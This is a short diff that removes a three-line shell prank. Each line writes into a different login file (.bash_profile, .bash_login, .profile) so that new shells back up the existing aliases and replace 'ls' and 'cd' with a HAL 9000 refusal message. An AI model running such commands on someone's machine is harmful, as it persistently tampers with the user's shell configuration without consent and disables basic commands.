@@ -1,3 +1,0 @@
-echo "alias>>~/.old-alias;alias ls='echo Im sorry dave, Im afraid I cant do that||cat';alias cd='echo Im sorry dave, Im afraid I cant do that||cat'">>~/.bash_profile
-echo "alias>>~/.old-alias;alias ls='echo Im sorry dave, Im afraid I cant do that||cat';alias cd='echo Im sorry dave, Im afraid I cant do that||cat'">>~/.bash_login
-echo "alias>>~/.old-alias;alias ls='echo Im sorry dave, Im afraid I cant do that||cat';alias cd='echo Im sorry dave, Im afraid I cant do that||cat'">>~/.profile
